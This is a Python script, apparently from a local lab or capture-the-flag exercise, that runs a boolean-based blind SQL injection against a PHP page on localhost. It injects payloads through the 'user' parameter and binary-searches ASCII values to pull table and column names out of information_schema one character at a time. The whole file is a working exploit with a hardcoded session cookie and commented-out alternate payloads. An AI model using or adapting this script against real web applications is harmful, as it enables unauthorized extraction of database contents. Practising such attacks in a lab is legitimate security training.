import requests

url = "http://localhost:8000/blindsqli.php"
alice_description = "In wonderland right now :O"
session_cookies = { 'PHPSESSID': 'e1c5b47701a9753783f56f9c770a7e0a' }
table_name = ""
print("Looking for possible table names...")

# Loop through all 32 character positions
for position in range(1, 33): 
    low = 32    # Lowest printable ASCII character (space)
    high = 126  # Highest printable ASCII character (~)
    
    while low <= high:
        mid = (low + high) // 2
        # payload for finding the table name: 
        # payload = f"alice' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'secure' LIMIT 0,1), {position}, 1)) > {mid} -- "
        # payload for finding the column names:

        payload = f"alice' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name = '789b05678e7f955d2cf125b0c05616c9' LIMIT 0,1), {position}, 1)) > {mid} -- "

        params = { 'user': payload }
        response = requests.get(url, params=params, cookies=session_cookies)
        
        if alice_description in response.text:
            low = mid + 1
        else:
            high = mid - 1
            
    table_name += chr(low)
    print(f"Current prefix: {table_name}")

print(f"Final table name: {table_name}")
